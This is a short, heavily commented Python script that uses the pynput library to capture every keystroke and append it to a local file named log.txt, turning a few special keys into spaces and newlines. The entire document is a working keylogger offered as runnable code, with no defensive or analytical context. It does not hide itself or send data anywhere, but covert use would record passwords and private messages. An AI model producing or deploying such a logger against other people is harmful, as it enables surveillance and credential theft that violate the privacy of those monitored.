from pynput.keyboard import Listener  # Import Listener to capture keyboard inputs

def write_to_file(key):
    letter = str(key)  # Convert the key to a string
    letter = letter.replace("'", "")  # Remove extra quotation marks

    # Handle special keys
    if letter == 'Key.space':  
        letter = ' '  # Replace "space" with an actual space
    if letter == 'Key.shift_r':  
        letter = ''  # Ignore the right Shift key
    if letter == "Key.ctrl_l":  
        letter = ""  # Ignore the left Ctrl key
    if letter == "Key.enter":  
        letter = "\n"  # Move to a new line when Enter is pressed

    # Open the file and save the key press
    with open("log.txt", 'a') as f:  # Open the log file in append mode
        f.write(letter)  # Write the key to the file

# Start the keyboard listener
with Listener(on_press=write_to_file) as l:  
    l.join()  # Keep the program running until manually stopped
